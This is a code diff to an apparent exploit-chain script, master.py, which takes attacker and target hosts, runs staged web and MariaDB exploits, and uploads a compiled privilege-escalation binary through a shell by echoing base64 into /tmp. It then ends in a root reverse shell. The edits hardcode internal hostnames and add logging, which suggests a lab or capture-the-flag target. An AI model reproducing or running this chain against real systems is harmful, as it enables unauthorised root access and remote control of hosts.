@@ -28,11 +28,11 @@ def create_server():
 try:
     LHOST = sys.argv[1]
     RHOST = sys.argv[2]
-    MARIADB_RHOST_INTERNAL = sys.argv[3]
-    WEBSERVER_RHOST_INTERNAL = sys.argv[4]
+    MARIADB_RHOST_INTERNAL = "mariadb"
+    WEBSERVER_RHOST_INTERNAL = "website"
 
 except:
-    print("Usage: python master.py [LHOST] [RHOST] [MARIADB_RHOST_INTERNAL] [WEBSERVER_RHOST_INTERNAL]")
+    print("Usage: python master.py [LHOST] [RHOST]")
     sys.exit(1)
 
 def web_exploit(shell1, shell2):
@@ -55,9 +55,11 @@ def watchdog_exploit(conn):
     system("musl-gcc -Os -static -s -o wexp watchdog_exploit.c")
     system("base64 wexp > wexp.b64")
     watchdog = open("wexp.b64", "r").read().split("\n")
+    context.log_level = "warning"
     for line in watchdog:
         conn.sendline(f"echo {line} >> /tmp/wexp.b64")
     conn.sendline("base64 -d /tmp/wexp.b64 > /tmp/wexp")
+    context.log_level = "debug"
     conn.sendline("chmod +x /tmp/wexp")
 
 def root_revshell(conn1, conn2):
@@ -72,6 +74,8 @@ if __name__ == "__main__":
     create_server()
     get_exploit_files(conn1)
     mariadb_exploit(conn1, conn2)
+    print("[!] mariadb exploit fired...")
+    print(conn2.recvrepeat(timeout=5))
     watchdog_exploit(conn2)
     root_revshell(conn1, conn2)
 
